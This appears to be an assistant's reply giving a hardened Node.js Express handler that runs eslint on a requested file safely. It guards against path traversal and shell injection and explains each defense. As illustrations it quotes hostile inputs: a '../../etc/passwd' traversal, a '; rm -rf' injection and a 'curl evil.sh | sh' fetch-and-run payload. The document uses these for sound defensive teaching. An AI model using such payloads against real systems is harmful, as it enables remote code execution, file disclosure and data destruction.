Here's a safe implementation. The two things that'll bite you here are **path traversal** (`../../etc/passwd`) and **shell injection** (`; rm -rf`), so the handler resolves the path inside the checkout and uses `execFile` (no shell) with an argument array.

```javascript
const path = require('path');
const fs = require('fs');
const { execFile } = require('child_process');

// Root of the checkout we're allowed to lint. Nothing outside this is reachable.
const CHECKOUT_ROOT = path.resolve(__dirname, 'checkout');

function lintHandler(req, res) {
  const requested = req.params.filename;

  // Resolve against the root, then verify the result is still inside it.
  // This defeats ../ traversal, absolute paths, and symlink-free tricks.
  const target = path.resolve(CHECKOUT_ROOT, requested);
  const rootWithSep = CHECKOUT_ROOT + path.sep;
  if (target !== CHECKOUT_ROOT && !target.startsWith(rootWithSep)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // Reject anything that isn't a regular file (dirs, devices, dangling symlinks).
  fs.lstat(target, (statErr, stats) => {
    if (statErr || !stats.isFile()) {
      return res.status(404).json({ error: 'File not found' });
    }

    // execFile — not exec — so the filename is an argv entry, never parsed by a shell.
    execFile(
      'eslint',
      ['--format', 'json', '--', target],
      { cwd: CHECKOUT_ROOT, timeout: 15_000, maxBuffer: 2 * 1024 * 1024 },
      (err, stdout, stderr) => {
        // eslint exits non-zero when it finds lint errors — that's a normal result,
        // not a handler failure. Only treat spawn/timeout errors as 500s.
        if (err && err.code === undefined) {
          return res.status(500).json({ error: 'Linter failed to run' });
        }
        res.type('application/json').send(stdout || stderr || '[]');
      }
    );
  });
}

module.exports = { lintHandler };
```

Key defenses:

- **`path.resolve` + prefix check** confines every request to `CHECKOUT_ROOT`. `../../../etc/passwd` resolves to an absolute path outside the root and gets rejected with a 400.
- **`execFile` with an argv array** means the filename is passed as a literal argument. A name like `foo.js; curl evil.sh | sh` becomes one harmless (nonexistent) filename — no shell ever interprets it.
- **`--` before the path** stops a filename starting with `-` from being read as an eslint flag.
- **`lstat` + `isFile`** avoids linting directories or following a symlink out of the tree.
- **`timeout` / `maxBuffer`** bound resource use so a pathological file can't hang or OOM the process.

One thing to confirm on your side: if `CHECKOUT_ROOT` itself can contain symlinks that point outside the tree, add an `fs.realpath` check on `target` and re-verify the prefix — the string check above assumes the root's contents are trusted not to link outward.

